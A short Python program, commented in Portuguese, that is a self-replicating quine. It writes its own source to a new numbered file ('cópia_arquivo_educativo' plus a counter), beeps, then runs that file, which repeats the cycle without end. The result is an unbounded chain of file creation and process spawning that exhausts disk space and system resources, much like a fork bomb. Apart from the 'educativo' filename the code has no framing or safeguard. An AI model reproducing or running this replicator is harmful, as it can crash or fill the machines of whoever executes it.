import sys
import subprocess

def criar_arquivo(nome_arquivo, conteudo):
    with open(nome_arquivo, 'w', encoding='utf-8') as f:
        f.write(conteudo)

# Código do programa, com a declaração de codificação correta
codigo = '''import sys
import subprocess

def criar_arquivo(nome_arquivo, conteudo):
    with open(nome_arquivo, 'w', encoding='utf-8') as f:
        f.write(conteudo)

# Código do programa
codigo = {0}{0}{0}{1}{0}{0}{0}

# Contador para nomear os arquivos
contador = int(sys.argv[1]) if len(sys.argv) > 1 else 1
novo_arquivo = f"cópia_arquivo_educativo{{contador + 1}}.py"

criar_arquivo(novo_arquivo, codigo.format(chr(39), codigo))

# Executa o novo arquivo criado
print('\a')

subprocess.run(f"python {{novo_arquivo}} {{contador + 1}}")
'''

# Contador para nomear os arquivos
contador = int(sys.argv[1]) if len(sys.argv) > 1 else 1
novo_arquivo = f"cópia_arquivo_educativo{contador + 1}.py"

criar_arquivo(novo_arquivo, codigo.format(chr(39), codigo))

# Executa o novo arquivo criado
print('\a')

subprocess.run(f"python {novo_arquivo} {contador + 1}")